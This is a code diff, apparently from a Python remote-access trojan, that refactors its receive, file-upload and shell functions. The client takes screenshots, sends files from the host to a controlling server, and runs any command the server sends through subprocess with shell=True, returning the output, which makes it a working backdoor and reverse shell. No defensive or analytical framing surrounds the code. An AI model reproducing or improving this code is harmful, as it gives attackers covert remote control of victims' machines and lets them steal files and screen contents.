@@ -17,12 +17,12 @@ def take_screen_shot():
 
         del(raw_pixels, img_data)
 
-def recv():
+def recv(buff_size=1024):
     data_size = int(server_con.recv(12).decode())
 
     data = bytes()
     while len(data) < data_size:
-        data += server_con.recv(1024)
+        data += server_con.recv(buff_size)
 
     return data
 
@@ -33,12 +33,14 @@ def send(data):
     server_con.sendall(data)
 
 def upload_file(file_name):
-    file = open(file_name, "rb")
-    file_data = file.read()
-    file.close()
-
-    send(file_data)
-
+    try:
+        with open(file_name, "rb") as file:
+            file_data = file.read()
+            send(file_data)
+            
+    except:
+        print("Error opening file")
+    
 def open_shell():
     while True:
         print("waiting for cmd...")
@@ -60,10 +62,12 @@ def open_shell():
             file_name = data.decode()[3:]
             print(f"Uploading File...{file_name}")
             upload_file(file_name)
+            continue
+            
         elif data.decode()[:2] == "up":
-            file_path = data.decode()[2:]
+            file_path = data.decode()[3:]
             print(f"Downloading File...{file_path}")
-
+            
         else:
             output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             str_msg = output[0].decode()
